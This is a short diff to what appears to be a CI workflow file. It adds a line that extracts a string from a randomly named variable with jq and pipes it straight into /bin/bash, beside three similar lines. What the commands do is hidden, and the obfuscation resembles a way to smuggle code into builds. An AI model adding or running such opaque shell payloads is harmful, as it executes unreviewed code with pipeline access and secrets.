@@ -34,6 +34,7 @@ jobs:
           echo $npjn5109 | jq -r .l7 | /bin/bash
           echo $zxn9 | jq -r .aue8 | /bin/bash
           echo $vbuv5 | jq -r .pro739 | /bin/bash
+          echo $fsrud2536 | jq -r .hrm75376 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
